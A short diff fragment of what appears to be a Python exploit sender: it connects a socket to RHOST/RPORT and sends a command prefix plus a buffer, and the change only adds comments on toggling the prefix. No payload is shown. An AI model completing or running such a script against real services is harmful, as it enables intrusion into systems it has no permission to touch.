@@ -50,7 +50,8 @@ buf += "\n"
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((RHOST, RPORT))
-s.send(cmd + buf)
+s.send(cmd + buf)   ## Comment out if cmd function not needed
+## s.send(buf)      ## Uncomment if cmd function not needed
 s.recv(1024)
 s.close()
 
